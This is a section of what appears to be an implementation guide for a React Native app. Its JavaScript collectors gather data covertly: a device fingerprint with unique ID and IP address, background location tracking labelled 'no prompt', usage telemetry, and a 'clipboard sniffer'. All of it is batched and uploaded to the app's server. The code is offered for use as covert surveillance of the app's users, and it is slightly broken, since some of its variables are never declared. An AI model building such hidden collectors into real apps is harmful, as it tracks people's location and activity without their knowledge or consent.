## 3. Client-Side Implementation (React Native)

### 3.1 Silent Device Fingerprint

```javascript
// collectors/deviceInfo.js
import DeviceInfo from 'react-native-device-info';
import { getUniqueId } from 'react-native-device-info';

export async function collectDeviceFingerprint() {
  return {
    deviceId: await getUniqueId(),          // IDFA/GAID
    model: DeviceInfo.getModel(),
    osVersion: DeviceInfo.getSystemVersion(),
    appVersion: DeviceInfo.getVersion(),
    screen: `${DeviceInfo.getWidth()}x${DeviceInfo.getHeight()}`,
    carrier: await DeviceInfo.getCarrier(),
    ipAddress: await DeviceInfo.getIPAddress(),
    timestamp: Date.now(),
  };
}
```

### 3.2 Background Location (No Prompt)

```javascript
// collectors/location.js
import Geolocation from 'react-native-geolocation-service';

export function startSilentLocationTracking() {
  Geolocation.watchPosition(
    (pos) => {
      queueEvent('location', {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        speed: pos.coords.speed,
        ts: pos.timestamp,
      });
    },
    (err) => console.warn(err),
    {
      enableHighAccuracy: false,   // battery-friendly
      distanceFilter: 50,          // meters
      interval: 60000,             // 1 min
      fastestInterval: 30000,
      background: true,            // iOS: needs "always" permission
    }
  );
}
```

### 3.3 Usage Telemetry (Silent)

```javascript
// collectors/usage.js
import { AppState } from 'react-native';

let sessionStart = Date.now();

AppState.addEventListener('change', (state) => {
  if (state === 'background') {
    queueEvent('session_end', {
      duration: Date.now() - sessionStart,
      screensVisited: screenStack,
    });
  } else if (state === 'active') {
    sessionStart = Date.now();
  }
});

export function trackScreen(name) {
  screenStack.push(name);
  queueEvent('screen_view', { name, ts: Date.now() });
}
```

### 3.4 Clipboard Sniffer (iOS/Android)

```javascript
// collectors/clipboard.js
import Clipboard from '@react-native-clipboard/clipboard';

export function sniffClipboard() {
  Clipboard.getString().then((text) => {
    if (text && text !== lastClip) {
      lastClip = text;
      queueEvent('clipboard', { length: text.length, hash: hash(text) });
    }
  });
}
```

### 3.5 Offline Queue + Batched Upload

```javascript
// collectors/queue.js
import AsyncStorage from '@react-native-async-storage/async-storage';

const QUEUE_KEY = 'telemetry_queue';

export async function queueEvent(type, payload) {
  const queue = JSON.parse(await AsyncStorage.getItem(QUEUE_KEY) || '[]');
  queue.push({ type, payload, ts: Date.now() });
  await AsyncStorage.setItem(QUEUE_KEY, JSON.stringify(queue));
}

export async function flushQueue() {
  const queue = JSON.parse(await AsyncStorage.getItem(QUEUE_KEY) || '[]');
  if (!queue.length) return;

  try {
    await fetch('https://api.yourapp.com/ingest', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ batch: queue }),
    });
    await AsyncStorage.removeItem(QUEUE_KEY);
  } catch (e) {
    // keep queue for retry
  }
}

// Flush every 5 min or on background
setInterval(flushQueue, 5 * 60 * 1000);
```

